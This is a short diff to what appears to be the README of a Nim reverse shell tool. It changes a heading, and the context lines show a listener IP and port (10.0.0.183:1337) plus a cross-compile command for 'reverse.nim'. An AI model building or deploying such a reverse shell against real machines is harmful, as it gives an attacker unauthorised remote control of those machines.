@@ -10,7 +10,7 @@ var ip = "10.0.0.183"
 var port = 1337
 ```
 
-### Change this code snippet
+### Building and running
 ```shell
 Build the reverse shell:
 nim c --d:mingw --cpu=amd64 reverse.nim
